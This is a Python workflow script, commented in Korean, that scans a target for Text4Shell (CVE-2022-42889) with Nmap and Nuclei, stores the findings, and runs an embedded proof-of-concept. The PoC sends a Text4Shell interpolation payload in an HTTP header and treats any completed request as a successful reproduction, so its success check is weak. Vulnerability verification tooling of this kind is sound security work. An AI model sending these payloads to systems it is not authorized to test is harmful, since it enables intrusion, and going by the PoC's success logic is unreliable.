#!/usr/bin/env python3
"""
Text4Shell (CVE-2022-42889) 대상에 대해:

1. Nmap/Nuclei 스캔으로 취약점 스캔
2. Nuclei 결과를 DB에 저장
3. 해당 스캔 결과를 기반으로 PoC 재현 파이프라인 실행
4. PoC 재현 결과를 DB(poc_reproductions)에 저장
"""

from typing import Optional

import logging

from src.pipeline.scanner_pipeline import ScannerPipeline
from src.pipeline.poc_pipeline import POCPipeline
from src.database import get_db
from src.database.repository import ScanResultRepository


logger = logging.getLogger("text4shell_workflow")


TEXT4SHELL_POC_SCRIPT = """\
import os
import sys
import requests

def main():
    target_host = os.environ.get("TARGET_HOST", "")
    if not target_host:
        print("TARGET_HOST is not set")
        sys.exit(1)

    # Text4Shell 취약한 서비스가 8080 포트에서 동작한다고 가정
    if target_host.startswith("http://") or target_host.startswith("https://"):
        base_url = target_host
    else:
        base_url = f"http://{target_host}:8080"

    url = base_url

    # Text4Shell 전형적인 payload 예시 (실제 환경에 맞게 수정 가능)
    payload = "${url:UTF-8::http://example.com}"

    headers = {
        "User-Agent": "V2R-Text4Shell-POC",
        "X-Api-Version": payload,
    }

    try:
        resp = requests.get(url, headers=headers, timeout=5)
        print("Sent Text4Shell PoC request to", url)
        print("Response status:", resp.status_code)
        # 여기서는 단순히 요청이 성공적으로 전송되면 PoC 성공으로 간주
        sys.exit(0)
    except Exception as e:
        print("PoC request failed:", str(e))
        sys.exit(1)


if __name__ == "__main__":
    main()
"""


def find_latest_nuclei_scan_id(target_url: str, days: int = 1) -> Optional[int]:
    """특정 target_url에 대한 가장 최근 Nuclei 스캔 결과 ID 조회"""
    db = get_db()
    with db.get_session() as session:
        repo = ScanResultRepository(session)
        scans = repo.get_recent(days=days, limit=50)
        for s in scans:
            if s.scanner_name == "nuclei" and s.target_host == target_url:
                return s.id
    return None


def run_text4shell_workflow(target: str, recent_days: int = 1) -> None:
    """
    Text4Shell 스캔 + PoC 워크플로우 실행

    Args:
        target: EC2 퍼블릭 IP 또는 호스트네임 (예: 13.125.x.x 또는 http://13.125.x.x:8080)
        recent_days: Nuclei 스캔 결과를 조회할 기간(일)
    """
    logger.info("=" * 80)
    logger.info("Text4Shell (CVE-2022-42889) 스캔 및 PoC 워크플로우 시작")
    logger.info("=" * 80)

    # 1. 대상 URL 구성 (8080 포트의 취약한 Text4Shell 서비스)
    if target.startswith("http://") or target.startswith("https://"):
        target_url = target
    else:
        target_url = f"http://{target}:8080"

    logger.info("Target URL: %s", target_url)

    scanner = ScannerPipeline()

    # (옵션) 포트 8080에 대해 Nmap 간단 스캔
    try:
        logger.info("[1/3] Nmap 스캔 (포트 8080)")
        nmap_result = scanner.run_nmap_scan(
            target=target,
            ports="8080",
            scan_type="-sV",
            save_to_db=True,
        )
        logger.info(
            "Nmap scan done - success=%s, findings=%s",
            nmap_result.get("success"),
            nmap_result.get("findings_count"),
        )
    except Exception as e:
        logger.warning("Nmap 스캔 중 오류(계속 진행): %s", e)

    # 2. Nuclei 스캔 (Text4Shell 취약점 템플릿 직접 지정)
    logger.info("[2/3] Nuclei 스캔 (취약점 스캔)")
    text4shell_template = "/usr/local/bin/nuclei-templates/dast/cves/2022/CVE-2022-42889.yaml"
    nuclei_result = scanner.run_nuclei_scan(
        target=target_url,
        template_files=[text4shell_template],
        severity=["critical", "high"],
        save_to_db=True,
    )

    if not nuclei_result.get("success"):
        logger.error("Nuclei 스캔 실패: %s", nuclei_result.get("error"))
        return

    logger.info(
        "Nuclei scan done - findings=%s, cve_count=%s",
        nuclei_result.get("findings_count"),
        nuclei_result.get("cve_count"),
    )

    # 3. Nuclei 스캔 결과에 대한 ScanResult ID 찾기
    scan_result_id = find_latest_nuclei_scan_id(target_url, days=recent_days)
    if not scan_result_id:
        logger.error("DB에서 Nuclei 스캔 결과를 찾지 못했습니다. PoC를 진행할 수 없습니다.")
        return

    logger.info("Using scan_result_id=%s for PoC reproduction", scan_result_id)

    # 4. PoC 재현 실행
    logger.info("[3/3] Text4Shell PoC 재현 실행")
    poc_pipeline = POCPipeline()

    poc_result = poc_pipeline.run_poc_reproduction(
        scan_result_id=scan_result_id,
        poc_script=TEXT4SHELL_POC_SCRIPT,
        poc_type="rce",
        cve_id="CVE-2022-42889",
        source="manual",
        target_host=target_url,
        collect_evidence=False,  # 속도와 단순화를 위해 증거 수집은 비활성화
    )

    if poc_result.get("success"):
        logger.info(
            "✓ Text4Shell PoC 재현 성공 - reproduction_id=%s, status=%s",
            poc_result.get("reproduction_id"),
            poc_result.get("status"),
        )
    else:
        logger.error("Text4Shell PoC 재현 실패: %s", poc_result.get("error"))

    logger.info("=" * 80)
    logger.info("Text4Shell 워크플로우 종료")
    logger.info("=" * 80)


